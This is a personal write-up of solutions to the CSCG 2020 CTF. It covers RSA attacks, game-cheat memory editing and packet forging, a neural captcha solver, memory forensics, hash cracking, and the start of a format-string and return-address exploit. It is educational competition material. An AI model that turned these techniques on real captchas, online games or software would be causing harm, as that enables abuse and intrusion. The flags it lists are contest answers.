# About Myself

I am Neobeo, a 32-year-old hacker from London (as of writing). I don't speak a lick of German, which of course means that Google Translation was my best friend in the course of the [CSCG Qualification CTF (Earth category)](https://earth.2020.cscg.de/).

While I've been hacking for almost two thirds of my life, this is actually my first time completing in a full CTF challenge, so much thanks to onepiecefreak for introducing me to it and leading me down this incredible rabbit hole.

This write-up is intended to be a high-level overview of how I solved my challenges, which makes it more of interest to people who have actually solved or attempted these challenges. It is not intended to be a step-by-step guide on how to attack them, nor does it explain how to mitigate these exploits.

While I do try to sketch out enough details for the motivated reader to hopefully reproduce my results, I understand that it's probably going to be lacking in some parts. Feel free to approach me on Discord where I can elaborate on those details (one-to-one chats are so much easier than a full write-up).

# Table of Contents
- [Crypto](#crypto)
  * [Intro to Crypto 1](#intro-to-crypto-1)
  * [Intro to Crypto 2](#intro-to-crypto-2)
  * [Intro to Crypto 3](#intro-to-crypto-3)
  * [RSA Service](#rsa-service)
- [Gamehax (White Rabbit)](#gamehax--white-rabbit-)
  * [Follow The White Rabbit - Cave](#follow-the-white-rabbit---cave)
  * [Follow The White Rabbit - Datamining](#follow-the-white-rabbit---datamining)
- [Gamehax (Maze)](#gamehax--maze-)
  * [Maze - The Floor Is Lava / Tower](#maze---the-floor-is-lava---tower)
  * [Maze - Emoji](#maze---emoji)
  * [Maze - Map Radar](#maze---map-radar)
  * [Maze - Maze Runner / M4z3 Runner](#maze---maze-runner---m4z3-runner)
- [Misc](#misc)
  * [Captcha](#captcha)
  * [Polyrun](#polyrun)
  * [Sanity Check](#sanity-check)
  * [win_eXPerience 1](#win-experience-1)
  * [win_exPerience 2](#win-experience-2)
- [Pwn](#pwn)
  * [Intro to Pwning 1](#intro-to-pwning-1)
  * [Intro to Pwning 2](#intro-to-pwning-2)
  * [Intro to Pwning 3](#intro-to-pwning-3)
  * [ropnop](#ropnop)
  * [Squirrel as a Service](#squirrel-as-a-service)
- [Reverse Engineering](#reverse-engineering)
  * [Intro to Reversing 1](#intro-to-reversing-1)
  * [Intro to Reversing 2](#intro-to-reversing-2)
  * [Intro to Reversing 3](#intro-to-reversing-3)
  * [reme Part 1](#reme-part-1)
  * [reme Part 2](#reme-part-2)
  * [eVMoji](#evmoji)
- [Stegano](#stegano)
  * [Intro to Stegano 1](#intro-to-stegano-1)
  * [Intro to Stegano 2](#intro-to-stegano-2)
  * [Intro to Stegano 3](#intro-to-stegano-3)
  * [Matrix](#matrix)
- [Web](#web)
  * [Local Fun Inclusion](#local-fun-inclusion)
  * [StayWoke Shop](#staywoke-shop)
  * [Xmas Shopping Site](#xmas-shopping-site)

<!----------------------------------------- Big Section Separator ------------------------------------------>

# Crypto

## Intro to Crypto 1
This one's pretty straightforward. The step by step guide provides a useful primer, but as it happens there are ready-made tools for this. We use one called [RsaCtfTool](https://github.com/Ganapati/RsaCtfTool).

The message is given numerically, so we need to feed into `uncipher` rather than `uncipherfile`. We use the following command line:
```
./RsaCtfTool.py --publickey pubkey.pem --uncipher "$(<message.txt)"
```
This succeeds via a FactorDB attack on the modulus.

The flag is `CSCG{factorizing_the_key=pr0f1t}`.

## Intro to Crypto 2
Exactly the same command line as before:
```
./RsaCtfTool.py --publickey pubkey.pem --uncipher "$(<message.txt)"
```

This succeeds via a Fermat attack on the modulus.

The flag is `CSCG{Ok,_next_time_I_choose_p_and_q_random...}`.

## Intro to Crypto 3
This one has a slight twist, where we have the same message encrypted with three different public keys. The order provided in `intercepted-messages.txt` in German, US, Russian. So we feed in our three public keys in this order. As before, we feed in the numbers via `uncipher`, with some bash-fu to insert commas between the numbers.
```
./RsaCtfTool.py --publickey german_government.pem,us_government.pem,russian_government.pem --uncipher "$(echo -n `grep -Eo [0-9]+ intercepted-messages.txt` | tr ' ' ,)"
```

This succeeds via Håstad's attack.

The flag is `CSCG{ch1nes3_g0vernm3nt_h4s_n0_pr0blem_w1th_c0ron4}`.

## RSA Service
This one is a lot more involved than the previous three. Where we had to decrypt an encrypted message in the earlier challenges, the task here is different: we have to derive a private key that decrypts a particular ciphertext (c = `Quack! Quack!`) into a particular plaintext (m = `Hello! Can you give me the flag, please? I would really appreciate it!`).

More specifically, we need to find primes *p* and *q*, and a positive integer *d* such that *c*<sup>d</sup> ≡ m (mod *pq*), with the constraint that *pq* > *m*. There seem to be two immediate ways to approach this:
1. Fix some *d* and try to find a corresponding *p* and *q*. This basically means finding large prime factors of (*c<sup>d</sup>* - m).
2. Fix some *p* and *q* and try to find a corresponding *d*.

The first one is the [integer factorisation problem](https://en.wikipedia.org/wiki/Integer_factorization) which is known to be difficult, so we decided on the second one. This is the [discrete logarithm problem](https://en.wikipedia.org/wiki/Discrete_logarithm), which is also difficult in general, but has special cases which can be solved efficiently.

One such special case, and is the one we will be using, is the [Pohlig-Hellman algorithm](https://en.wikipedia.org/wiki/Pohlig%E2%80%93Hellman_algorithm) for finding the discrete logarithm in a smooth-order group. Since *c*<sup>d</sup> ≡ m (mod *p*) and *c*<sup>d</sup> ≡ m (mod *q*) implies *c*<sup>d</sup> ≡ m (mod *pq*), it suffices to only look for primes *p* and *q* that are both one greater than a smooth integer. We arbitrarily decide to go for a small *p* and a large *q* > *m*.

At this point, there are probably additional mathematical constraints we can apply to reduce the sample space further, but we figure there's enough to just trial and error from here, so we arbitrarily pick *p* = 11, and can change it later if it doesn't work out. As for *q*, we look for primes of the form (*n* × 2<sup>559</sup> + 1) since log<sub>2</sub>(c) is around 558.2.

We mainly use `sympy` to run through our candidates, since it has a bunch of useful functions such as `isprime`, `discrete_log`, and `mod_inverse`. The full script is available at [RsaService.py](RsaService.py), but basically we obtain *p* = 11, *q* = 302 × 2<sup>559</sup> + 1, and *d* = `50163...01307`.

The resulting private key is:
```
-----BEGIN RSA PRIVATE KEY-----
MIIBfgIBAAJIBn0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAALAkgDyaa2Dg8lcUEg4YqM84CaWEJjFfxKRU0v1VJJhOAs
blpG3MvBQUYjkeFE1jS/SYtvvzP/ppR4M+ewymcCiyrImPwcfH24m3MCSACE6zqqM5A+Nn9j9+9d
JLy5jkd+OWCI73JZ9hjFaqxe6zNvIAgcgfAVftFgLFlOUYB+MHZFkUv64dUnRY+ULgnWUgXNe4kB
uwIBCwJIAJcAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAABAgEHAkgAhOs6qjOQPjZ/Y/fvXSS8uY5HfjlgiO9yWfYYxWqs
XuszbyAIHIHwFX7RYCxZTlGAfjB2RZFL+uHVJ0WPlC4J1lIFzXuJAbsCAQU=
-----END RSA PRIVATE KEY-----
```

We submit this to the server and everything works out perfectly.

The flag is `CSCG{下一家烤鴨店在哪裡？}`.

<!----------------------------------------- Big Section Separator ------------------------------------------>

# Gamehax (White Rabbit)

## Follow The White Rabbit - Cave
So you follow the white rabbit. It jumps into the well, and you follow suit, only to die upon hitting the bottom. How do we get around this?

There's a number of valid solutions here:
1. The cheat code. Having decompiled the game assembly (`Assembly-CSharp.dll`) in dnSpy, we dig through some random functions and discover that `UILoader.Update()` already has a cheat code where pressing the keys of FLAG teleports you to the bottom of the well. This is probably my favourite solution.
2. As before, we load the assembly in dnSpy. Except this time we find `PlayerController.CheckFallDeath()` which, as its name implies, kills you when you fall from a certain height. So you can remove the call to `Die()`, recompile it, then play the game and jump down the well without dying.
3. Datamining using a tool called [AssetStudio](https://github.com/Perfare/AssetStudio). Basically, if you load the `level2` file, you can see all the assets in the level. In particular, the Asset List allows you to filter by name, so searching for `flag` very quickly shows the desired flag:

![follow1.png](follow1.png)

The flag is `CSCG{data_mining_teleport_or_gravity_patch?}`.

## Follow The White Rabbit - Datamining
So you choose not to follow the white rabbit this time, and head in the direction away from the well. The rabbit shows up anyway, and leads you towards some kind of incomplete castle, but you can't get through the gate. How do we get around this?

Well, there are quite a few layers to this challenge, so let's inspect them one by one:
- Looking in dnSpy, we find a class called `PartialFlag2` which basically contains the text `and_datamining_scenes` (albeit slightly obfuscated). It also suggests that the flag is probably hard to get statically, as hinted by the aptly named `PartialFlag2.flagProbablyHardToGetStatically()`.
- Looking in AssetStudio, we find that `level5` is where PartialFlag2 makes an appearance. More specifically, it appears overlaid on top of the previous flag. The only problem is that it's quite difficult to determine exactly where it's overlapping. Plus there's a number of other images and/or texts that are also overlaid on the flag. This suggests we do need to "see" the actual flag in-game.
- First, let's visit the white rabbit. Our hack of choice is is the gravity hack: we decrease the gravity (`PlayerController.gravity`) so that we can simply jump over the gate and visit the rabbit. The rabbit gives some kind of spiel that there will be a future update. Yeah right. Anyway we know that the flag we want is in `level5`.
- Simply swapping the `level2` and `level5` files doesn't work. But combining them additively does. This is somewhat hinted in the `UILoader` class where the various UIs (fps/gameover/menu) are loaded additively on top of the current level. We do this by adding the line ```SceneManager.LoadSceneAsync("FlagLand_Update", LoadSceneMode.Additive);```
- Success... almost! We have the building with the flag... except we're now completely thwarted another gate, and this time we can't jump into the location.
- There are probably a few solutions here, such as disabling the collider. Since we're already near enough to flag, we choose to record our position at two points (marked with red stars):

![follow2a.png](follow2a.png)
 
 and then teleport to the average. So we calculate the average, and consequently add the following line into the assembly:
 ```this.m_CharCtrl.transform.position = new Vector3(-82.56f, 217.54f, 23.62f);```
 
 Finally, a complete success! We teleport to exactly where we wanted to be, and take a short walk to where the flag is.

![follow2b.png](follow2b.png)

The flag is `CSCG{03ASY_teleport_and_datamining_scenes}`.

<!----------------------------------------- Big Section Separator ------------------------------------------>

# Gamehax (Maze)

## Maze - The Floor Is Lava / Tower

This was quite the challenge, with plenty to do. We'll start off with the easier ones that require nothing more than a very easy application of Cheat Engine.

From the start, even before any exploration, the "obvious" thing to do was to try to modify the position. There are two parts to this:
1. Find the position. This is not at trivial as it sounds, since the location is duplicated in multiple places, and there are closely linked values like camera position etc. In any case, we made the assumption that the position must stored as 3 consecutive floats, which turned out to be right. We also assume that the axis is in fact aligned with the map and it's not at a 45 degree angle or something. So we focus on a single axis, and then use Cheat Engine's "has increased / has decreased" search options (if it fails, then we will try again with a negated axis). After getting down to a handful of values, we bisect it by force-freezing these values to see which ones actually "affect" the position. Turns out there is just the one value, so success! In our case, it was the X (eastward) value that we found, and the Y (upward) and Z (northward) values did immediately come after it. So it's a [left-handed coordinate system](https://en.wikipedia.org/wiki/Right-hand_rule#Coordinates).
2. Modify the position. This is not as obvious as it sounds. We found that modifying the Y was always fine, but modifying the X and Z values sometimes failed. After careful testing, the theory was that we could only teleport a maximum of 10 units from the current position (counted only in the X and Z directions). But even this failed sometimes, so there was some kind of speed limit as well. In any case, this was more than enough to get started, so the first obvious thing to do was to fly high up in the air and see what the level looked like. The following is actually two separate screenshots stitched together, but basically shows our first inkling of the maze.

![fullmaze.jpg](fullmaze.jpg)

That looks sensible enough. The world as we know it is 64x64, which seems a reasonable size. We also calculate that each "block" is this 64x64 world is exactly 7.5 units wide / long. This is perfect, because as it turns out, there is a server-side check to ensure that you cannot be positioned "inside" a wall at any time (where the wall goes infinitely high and low). But if we teleport 10 units we can bypass this check completely.

And that is what we did. By strategically crossing over walls, we manage to completely bypass and never explore the rest of the maze. Here's an example of a possible path we took, the actual one likely had a few more teleports but the idea is the same.

![tophalf.jpg](tophalf.jpg)

This gives us access to our first two locations, Lava and Tower. In between the two, we teleport to the outer edge of the maze. It's actually possible to go outside the maze, but we walk on the edge as it gives a much better view. From the tower we later go along the western edge downwards to the hangar, but this isn't depicted on the diagram.

Anyway, these turn out to be fairly straightforward challenges. For Lava you just need to avoid the floor, so freeze the Y value at some arbitrary high value. For Tower you need to climb somewhere high, so just set the Y value to something high, and fall as necessary.

Upon completing these challenges, the server gives us our flags:
- The flag for The Floor Is Lava is `CSCG{FLYHAX_TOO_CLOSE_TO_THE_SUN!}`.
- The flag for Tower is `CSCG{SOLVED_THE_MAZE...LONG_WAY_BACK!}`.

## Maze - Emoji
Having used nothing but Cheat Engine in the earlier part, this one required just a bit more effort. We used [Il2CppDumper](https://github.com/Perfare/Il2CppDumper) to figure out the class/method names. In particular, we find the very interesting `ServerManager.sendEmoji()`, and a breakpoint confirms that this is in fact sending different values depending on which emoji we send. Annoyingly enough, the emoji value has no correlation with the button pressed, but no matter. For ease of modification, we trace this back to its caller `UILoader.Update()`, which is what detects the input key and calls `sendEmoji()` as necessary. We obtain the following key to emoji map:

| Key | Emoji value | Emoji name |
| --- | ----------- | ---------- |
| 1 | 23 | smile |
| 2 | 22 | silly |
| 3 | 4 | cry |
| 4 | 18 | queasy |
| 5 | 12 | laughcrying |
| 6 | 10 | heart |
| 7 | 20 | shocked |
| 8 | 14 | laughsweat |
| 9 | 3 | cool |
| 0 | 8 | drool |

The advantage of going back to `UILoader.Update()` is that we can easily just replace the value with another. For example, the first of those is at address GameAssembly.dll+0x6E61D0 with the opcode
```mov edx, 0x17 (bytes: BA 17 00 00 00)```

This allows very easy editing / testing of this value, and we find at least a dozen other emoji, plus a flag emoji with a value of 13 (0x0D). When the flag emoji is sent the server responds with the flag.

![mazeemoji.jpg](mazeemoji.jpg)

The flag is `CSCG{Your_hack_got_reported_to_authorities!}`.

## Maze - Map Radar
This one doesn't require any additional tools beyond the ones we've already used. We're interpreting this challenge to mean "track the position of a particular player", so it stands to reason that we should try to see where they are in memory.

Looking through the `ServerManager` class again, we find that one of its members is a `Dictionary<uint, NPCController> players`. Furthermore, the `NPCController` has a `current_position` member which sounds like exactly what we're looking for.

Sounds straightforward enough, so it's just the technical details left. We can get the address to our ServerManager by setting a breakpoint, say, at `ServerManager.Update()` and observing RCX. We know from Il2CppDumper before that the `players` field is at offset 0x108, so we just have to figure out how the `Dictionary<>` is stored in memory. This is slightly trickier than an array because of the hashtable and linked lists, but not too bad since we have a [reference source](https://referencesource.microsoft.com/#mscorlib/system/collections/generic/dictionary.cs,d3599058f8d79be0). In any case, we find a player here by the name of "The White Rabbit" with a player ID of 0xFFFF1337. This is significantly different to all other players whose ID is less than 1000. So this must mean we're on the right track.

The rest is just keeping a record. We write a short script to record the position of The White Rabbit and run it for about half an hour. Having done this, we plot its position on a map. The result ends up looking pretty cool!

![mapradar.jpg](mapradar.jpg)

The flag is `CSCG{RADAR_HACK_XYZ}`.

## Maze - Maze Runner / M4z3 Runner

Note that it is (very) possible to solve Maze Runner without any of the below. But since it's a subset of M4z3 Runner anyway, we will only consider the latter. In particular, this write-up will largely be about trying to get the best time possible.

So we've used Cheat Engine and Il2CppDumper. What's next? Well, if we're going to try to beat the record we're probably going to need to decouple all the unnecessary fluff. And this basically means recreating the game client.

The most significant part of this, of course, is to reverse engineer the network traffic. We use [Wireshark](https://www.wireshark.org/) to view the traffic, but a cursory glance at the packets reveals very little: they've likely been obfuscated in some way. Fortunately, a quick look at `ServerManager.ReceiveDataThread()` tells us how to decipher the packets: the bytes (after the first two) are XORed by a XORpad, where this XORpad is an arithmetic progression (mod 255) whose initial term and common difference are given by the first and second byte respectively.

The structure of the packet (after decoding) is simple enough: the first byte represents the type, and the rest of the structure depends on this type. There are thirteen such types:

| First byte (hex) | Name | Length | Structure |
| ---------------- | ---- | ------ | ------------------- |
| 3C | Heartbeat | 18 | 0x3C, 0x33, two 64-bit timestamps (one local, one server) |
| 43 | GotFlag | variable | ASCII-encoded flag |
| 44 | Dead | 3 | 0x44, 0x20, 0x00 |
| 45 | Emoji | 10 | 0x45, 32-bit playerId, 32-bit timestamp, 8-bit emoji |
| 46 | Frozen | 3 | 0x46, 0x00, 0x00 |
| 49 | PlayerMetadata | variable | 0x49, 32-bit playerId, 16-bit unlocks, length-prefixed name |
| 4C | Login | 8 | 0x4C, 32-bit playerId, 16-bit unlocks, 0x02 (version) |
| 50 | PlayerData | multiple of 42 | multiple (0x50, 32-bit playerID, 64-bit timestamp, 96-bit position, 96-bit orientation, 40-bit groundedness)s concatenated |
| 52 | Checkpoint | 2 | 0x52, 8-bit checkpointId |
| 54 | Spawn | 14 | 0x54, 0x01, 96-bit position |
| 55 | Unlock | 3 | 0x55, 16-bit unlocks |
| 58 | Logout | 1 | 0x58 (sent if you've gone 20s without updating position) |
| 59 | AlreadyLoggedIn | 1 | 0x59 |

Similarly, we can list out the sent packets, which are also obfuscated in the same way:

| First byte (hex) | Name | Length | Structure |
| ---------------- | ---- | ------ | ------------------- |
| 3C | Heartbeat | 18 | 0x3C, 0x33, 64-bit secret, 64-bit timestamp |
| 45 | Emoji | 10 | 0x45, 64-bit secret, 8-bit emoji |
| 49 | QueryPlayerMetadata | 13 | 0x49, 64-bit secret, 32-bit playerId   |
| 4C | Login | 42 | 0x4C, 64-bit secret, length-prefixed name, pad with NULs |
| 50 | PlayerData | 46 | 0x50, 64-bit secret, 64-bit timestamp, 96-bit position, 96-bit orientation, 40-bit groundedness |

Other notes:
- Position is stored in fixed-point: X,Y,Z are 32-bit ints divided by 10000
- Orientation is Euler Angles in fixed-point: e<sub>X</sub>,e<sub>Y</sub>,e<sub>Z</sub> are 32-bit ints divided by 10000
- Groundedness is an 8-bit trigger, 16-bit grounded, 16-bit notGrounded
- The 64-bit secret is the first 8 bytes of the SHA256 of the secret string, and identifies you basically

With that out of the way, we have everything to build our game client. The flow will be something like this:
- We send a login request packet stating our secret and name.
- The server either says we're already logged in, or accepts our login and tells us our playerId and what we've unlocked
- The server then spawns us at a random position in the 5x5 field
- We send a bunch of data packets to update our position, so that we go through all the checkpoints
- Hope for success!

Turns out, that's only half the job done. If we're going to get a good time, we'll need to minimise the time between sending the packets for the first and last checkpoints. This sounds like a standard graph theoretical problem, except with a lot of unknowns. We model the walls as being illegal in its inner two thirds, and the checkpoints as circular. Under these assumptions, we optimise the path using Dijkstra's algorithm to get the following path:

![m4z3runn3r.jpg](m4z3runn3r.jpg)

Here the blue nodes are checkpoints, and the red nodes are intermediate steps between them which are necessary due to the 10-unit movement limit. From the first blue point to the last blue point (inclusive), we count exactly 13 blue points and 33 red points, for a total of 46 packets. (Before that we have an additional 10-13 packets depending on the starting spawn point, so combined with the initial login request packet we only send 60 packets at most.)

Ok, so the question becomes: how fast can we send these? From our local machine in London we found that we can send packets with a delay of around 12ms between them. Any faster and it results in some packet loss and/or arriving out of order on the server side. This gives an initial M4z3 Runner time of 45 × 12ms = 0.540s, where we only count 45 rather than 46 because there's no need to count a delay after the last packet.

Of course this is unsafisactory, so we got ourselves an AWS service running from Frankfurt. From here the UDP transmission seems to be very stable. Instead we see a new problem: It would appear that the game server is multi-threaded and that if you send two consecutive packets too quickly, the second would be doing its position check before the first could update its position. This is mostly evident when you send two packets to a checkpoint position at the same time and get two checkpoint packets in return. It's possible that this quantum position effect can actually be exploited to bring the time down even further, but we didn't explore this possibility and chose to stick with classical positioning.

Anyway, the sweet spot seems to be around 0.6ms (that's 600μs), any faster than this and anything after the first position packet is effectively ignored. This is probably also dependent on the number of other players and other random factors, but seems a reasonable benchmark. Anyway, at 0.6ms, we find that it almost always fails at the starting checkpoint. The working theory is that checkpoints take a slightly longer time to update (maybe because they have to send a checkpoint packet). But anyway, it seems to work out when the delay after a checkpoint position is increased to around 0.7ms. Subsequently, we end up with a final time of 12 × 0.7ms + 33 × 0.6ms = 28.2ms, or as it shows on the leaderboard, 0.028s. Our implementation of this can be found on [maze.linq](maze.linq).

Whatever the time (as long as it's under 5s), the server rewards us with two flags:
- The flag for Maze Runner is `CSCG{SPEEDH4X_MAZE_RUNNER_BUNNYYYY}`.
- The flag for M4z3 Runn3r is `CSCG{N3VER_TRUST_T1111ME}`.


<!----------------------------------------- Big Section Separator ------------------------------------------>

# Misc

## Captcha
As its name implies, this is a captcha challenge. The aim is to write a bot the solves captchas like these:

![captcha1.png](captcha1.png)

Now, this is reminiscent of the [MNIST handwritten digits database](https://en.wikipedia.org/wiki/MNIST_database), except the MNIST database already has the digits beautifully cropped and centered. So there's some additional work to be done.

Before we begin, we should point out that the implementation about to be described below is by no means the most accurate detection possible. The intention was to try out a first pass, and improve the detection rate as necessary, but this first pass turned out to be good enough for this challenge. Nevertheless, as we describe our implemention, we will make some notes about where we might have done some things differently.

The challenge is done over multiple stages, each with a 30 second limit:
1. **Baby Captcha**: A single captcha
2. **Human Captcha**: Three captchas
3. **Tool Assisted Captcha**: 10 captchas
4. **Bot Captcha**: 100 captchas
5. **Flag**: Presumably, the flag is revealed here

The *Baby Captcha* stage has the additional bonus that it tells you the solution if you get it wrong. Nice! This gives us an unlimited set of training data. We decided to go with 10,000 train images and zero (out-of-sample) test images. I mean, we can revisit the test data requirement later if necessary, but we figure we didn't have to worry about this for a start. Turns out we were right. Anyway, we wrote a quick-and-dirty script to collect such images along with the corresponding labels, except we didn't stop it in time and ended up with 10,528 images. Oh well, the more the merrier.

So, let's do a preliminary analysis of the images. We find that the images are 32-bit RGBA, but the colour channels are identical (R=G=B) so it's effectively grayscale + alpha. The alpha channel, for the most part, can be derived from the colour channel (*a* = (1 - *x*)<sup>2</sup>, where *a* and *x* are the alpha and colour channels values normalised to the unit interval [0, 1]). The exception is when two characters overlap: in this case this equation isn't obeyed due to some kind of alpha compositing. Here's an example applied to the earlier image: we recolour every pixel not satisfying this formula to red.

![captcha2.png](captcha2.png)

That said, we didn't actually use this observation as we managed to implement our first pass without it. So for the purpose of this write-up it's just a piece of trivia. Nevertheless, this might have been a useful candidate for identifying a "split point" for a merged set of characters.

Anyway, we decide to completely ignore the colour channel, and use only the alpha channel for everything. As before, we normalise this value into the range [0, 1] by dividing it by 255, mainly for convenience.

As discussed before, there are two components to this challenge:
1. The first is to actually split the image into individual glyphs
2. The second is to identify the glyphs

Unlike a photograph, the images in this challenge have the property that they were all painted on an empty background. In other words, we know exactly when the background contains no information. We exploit this by looking at columns, where we treat each column of pixels as a vector with 30 elements (each with a value in [0, 1]). The all-zero vector would mean the background is definitely empty, and the all-one vector would mean the background is entirely opaque.

We arbitrarily decide to define the "weight" of each column as the mean squared error from the vector to the all-zero vectors.

![captcha1.png](captcha1.png)

![captcha3.png](captcha3.png)

Here the red plot is a graph of the weight of each column, with the baseline being exactly zero. It's very easy to see from here how most of the letters get tokenised cleanly at zero-weight columns, but there's a slight problem where some pairs might be merged, such as `D6` and `MD` in this example.

We can do the earlier analysis we mentioned, but what we actually did was probably simpler: we defined characters to have a minimum length of 4 and a maximum length of 20, and anything longer than that gets split off at the minimum weight. Looking at the histogram, that approximates quite well the split point in both `D6` and `MD`.

Finally, we have a set of of 30-column high letters! In our example, this looks as follows:

![captcha4.png](captcha4.png)

Now, for step 2, we recall the MNIST used 28x28 images with the digits already centered. We do something similar here where we form a 20x20 image for each glyph, using its center of gravity as the midpoint. This gives the following illustration (we colour in the overlaps here, but in the actual implementation each glyph does not contain any pixels outside the above bounding box):

![captcha5.png](captcha5.png)

This reduces our challenge to just a slight variation of the MNIST problem. We opt to use a straightforward neural network:
- An input layer with 400 neurons
- First hidden layer with 64 neurons (ReLU activation)
- Second hidden layer with 64 neurons (ReLU activation)
- Output layer with 35 neurons (softmax activation). This is 10 digits plus 25 letters (O is rejected in place of 0).

The training is done as follows:
1. For each of the 10,538 images, perform the above splitting.
2. If it splits to same number of characters as its label (which happens for 99.5% of images) then continue, else skip the image.
3. We end up with 115,790 glyphs. We don't bother to manually check that these are all valid glyphs / labelled correctly, whatever.
4. We train on these 115,790 glyphs with 10 epochs. This gives something like a 99.7% (in-sample) accuracy.

Finally, let's go back and try to predict all of our training images. This ends up with a 99.2% success rate, which is probably good enough. We haven't done any testing on out-of-sample data, but we believe this will be a good enough representation anyway.

Based on these results, we probably didn't even need any hidden layers in our neural network, but oh well.

In any case, recall that we need our solver to correctly solve 114 consecutive captchas. 0.992<sup>114</sup> is around 0.4, or 40%. So if our calculations are right, we should the solve the challenge 2 out of 5 times. Well, probably worse than that since we didn't test out-of-sample, but let's just run it anyway. And... we succeeded on the third try, which gave us this image:

![captcha6.png](captcha6.png)

The source for our implementation as described above can be found in [captcha.linq](captcha.linq) (with our model serialised to [captcha_model.json](captcha_model.json)).

The flag is `CSCG{Y0UR_B0T_S0LV3D_THE_CAPTCHA}`.

## Polyrun
This honestly felt more like a stegano challenge than a... *Misc* challenge, whatever that might mean.

We spent an hour or two learning enough Perl to dissect the code, but ultimately we (correctly, somehow) decided that the Poly in **Poly**run is cluing the fact that the script was a polyglot. Rereading the description, we find that `Script.VeryBogusExecution` was hinting VBE script all along with its initials. Renaming `run.pl` to `run.vbe` allows us to execute it, only for a message box to pop up saying `CSCG[THIS_NOT_REAL_FLAG]`. If the flag contents are not clear enough, the brackets are of the wrong type to further indicate that it's not the real flag.

No matter. We find a [VBScript decrypter](https://master.ayra.ch/vbs/vbs.aspx) online and feed it the PL-cum-VBE file.  It returns the fairly short VBS code:
```
' CSCG{This_is_the_flag_yo}
MsgBox "CSCG[THIS_NOT_REAL_FLAG]", VBOKOnly, "Nope"
```

The flag is `CSCG{This_is_the_flag_yo}`.

## Sanity Check
Not much to be said here. You join the discord channel, search for "Sanity Check", and end up in the one channel which you are least likely to pronounce correctly: #ankündigungen. There you find the following image:

![Sanity Check](https://cdn.discordapp.com/attachments/669637569817870386/684123666606587982/3r68f9.jpg)

The flag is `CSCG{TAKE_THIS_INSTEAD}`.

## win_eXPerience 1

We are presented with a `memory.dmp` file, with no clues given as to what it is except that maybe it's related to WinXP. Inspecting it using a hex editor shows strings like VBCORE and VBCPU, which gives us enough to google and determine that this is a vmcore dump file, usually analysed using [Volatility](https://en.wikipedia.org/wiki/Volatility_(memory_forensics)), so that's what we will use.

The most obvious thing to do first is to look at the filesystem, so let's do that with the following command line:
```
vol.py -f memory.dmp mftparser --output=body -D output --output-file=output.body
```

Just skimming through `output.body`, we find the following lines of interest:
```
0|[MFT FILE_NAME] password.txt (Offset: 0x344d800)|30|---a-----------|0|0|0|1584897886|1584897886|1584897886|1584897886
0|[MFT STD_INFO] password.txt (Offset: 0x344d800)|30|---a-----------|0|0|0|1584901542|1584897936|1584897936|1584897886
0|[MFT FILE_NAME] flag.zip (Offset: 0x6de5000)|36|---a-----------|0|0|253|1584901600|1584901600|1584901600|1584901600
0|[MFT STD_INFO] flag.zip (Offset: 0x6de5000)|36|---a-----------|0|0|253|1584901621|1584901600|1584901621|1584897970
```

We find that `password.txt` (`output/file.0x344d800.data0.dmp`) contains the password `BorlandDelphiIsReallyCool`.

Opening `flag.zip` (`output/file.0x6de5000.data0.dmp`) reveals a passworded `flag.txt`, which we extract with the aforementioned password.

The flag is `CSCG{c4ch3d_p455w0rd_fr0m_0p3n_tru3_cryp1_c0nt41n3r5}`.

## win_exPerience 2

Looking through the rest of the filesystem, we find lots of delphi source code, but otherwise nothing to suggest a crackme. So let's look at the process memory instead using the following command line:

```
vol.py -f memory.dmp pslist
```

And... we find our item of interest!
```
Offset(V)  Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit         
---------- -------------------- ------ ------ ------ -------- ------ ------ ------------------------------ ------------------------------
0x8173ec08 CSCG_Delphi.exe        1920   1524      1       29      0      0 2020-03-22 18:27:45 UTC+0000
```

So let's dump it then:
```
vol.py -f memory.dmp -D output -p 1920
```
which gives us our very own copy of CSCG_Delphi.exe.

We know of course the DeDe has always been the go-to decompiler for Delphi programs, so let's go straight to that.

![delphi.png](delphi.png)

DeDe shows us the form, and we can look at the disassembly of the "Check Flag" button (or `TForm1.Button1Click`).

At this point it's really nothing more than a reverse engineering challenge. With a bit of luck, we find cracking this basically reduces the following table:

| Pointer  | MD5 Hash | Plaintext |
| -------- | -------- | --------- |
| 0x458DFC | 1EFC99B6046A0F2C7E8C7EF9DC416323 | dl0 |
| 0x458E08 | 25DB3350B38953836C36DFB359DB4E27 | kc4rc |
| 0x458E00 | C129BD7796F23B97DF994576448CAA23 | l00hcs |
| 0x458E0C | 40A00CA65772D7D102BB03C3A83B1F91 | !3m |
| 0x458E04 | 017EFBC5B1D3FB2D4BE8A431FA6D6258 | 1hp13d |

where three of the plaintexts can be found immediately using a [rainbow table](https://crackstation.net/), and the other two using [hashcat](https://en.wikipedia.org/wiki/Hashcat).

At this point, we make an educated guess to reverse the plaintexts and order them by the pointer, joining them with underscores in between. This turns out to be correct, saving us from having to reverse engineer more of the code.

The flag is `CSCG{0ld_sch00l_d31ph1_cr4ck_m3!}`.

<!----------------------------------------- Big Section Separator ------------------------------------------>

# Pwn

## Intro to Pwning 1
This one's straightforward enough: just overwrite the return address with the address of interest.

First we look at the `welcome` function, where we enter our name and it gets printed via `printf`. At this point, the stack frame is something like this:
- 255 bytes for the `read_buf` buffer
- 1 padding byte
- 8 bytes for the previous frame's `RBP`
- 8 bytes for the return address

This means that the return address is the 34th item from the base of the stack. Now, the linux x64 ABI pushes parameters in RDI, RSI, RDX, RCX, R8, R9 before the stack. For a printf call, RDI would contain the format, and the first 5 arguments would be passed via parameters. So to get the return address we want the 39th parameter.

Consequently, we let our name be `%39$p` which leaks the return address, e.g.
```
Enter your witch name:
%39$p
┌───────────────────────┐
│ You are a Hufflepuff! │
└───────────────────────┘
0x7f1b17800b21 enter your magic spell:
```
In this example, the last three nibbles are `b21`, which confirms that this is in fact the return address we want. Well, we want to get to `WINgardium_leviosa` which is at address `9ec`, so that's a simple change. One thing to note is that the stack needs to be aligned on a 16-byte boundary, so we jump to `9ed` instead (skipping over the `push rbp` instruction at `9ec`).

Overwriting this return address happens in the `AAAAAAAA` function, where we do the exact same calculation of our stack frame:
- 255 bytes for the `read_buf` buffer
- 1 padding byte
- 8 bytes for the previous frame's `RBP`
- 8 bytes for the return address

